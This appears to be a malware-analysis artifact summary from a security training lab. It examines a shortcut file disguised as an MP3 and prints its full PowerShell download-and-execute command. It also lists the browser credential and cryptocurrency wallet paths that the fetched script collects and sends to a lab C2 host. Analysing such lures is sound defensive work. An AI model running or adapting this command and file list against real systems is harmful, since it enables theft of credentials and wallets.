# Summary of Artifacts
## 1. Malicious Files
### somg.mp3
- Type: Windows Shortcut File (.lnk)
- Target: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
- Command Line Arguments:

```powershell
-ep Bypass -nop -c "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/MM-WarevilleTHM/IS/refs/heads/main/IS.ps1','C:\ProgramData\s.ps1'); iex (Get-Content 'C:\ProgramData\s.ps1' -Raw)"
```
- Functionality: Downloads and executes the IS.ps1 PowerShell script.

### song.mp3
- Type: MP3 Audio File
- Analysis: No malicious behavior detected during initial inspection; further metadata analysis ongoing.

## 2. Downloaded Script
### IS.ps1
- Functionality:
  - Searches for cryptocurrency wallet files in:
   - `$env:USERPROFILE\.bitcoin\wallet.dat`
   - `$env:USERPROFILE\.ethereum\keystore\*`
   - `$env:USERPROFILE\.monero\wallet`
   - `$env:USERPROFILE\.dogecoin\wallet.dat`
  - Searches for browser credential files:
    - Chrome: `$env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Login Data`
    - Firefox: `$env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\logins.json`
  - Logs findings to stolen_info.txt.
  - Exfiltrates data to C2 server (http://papash3ll.thm/data).

## 3. File System Artifacts
### stolen_info.txt
- Purpose: Stores logged data about discovered wallet and browser credential files.
- Location: Created in the current working directory.

## 4. Network Artifacts
### C2 Domain: http://papash3ll.thm
- Used for exfiltration of collected data.
  - GitHub Repository: https://raw.githubusercontent.com/MM-WarevilleTHM/IS/refs/heads/main/IS.ps1
- Source of the downloaded PowerShell script.
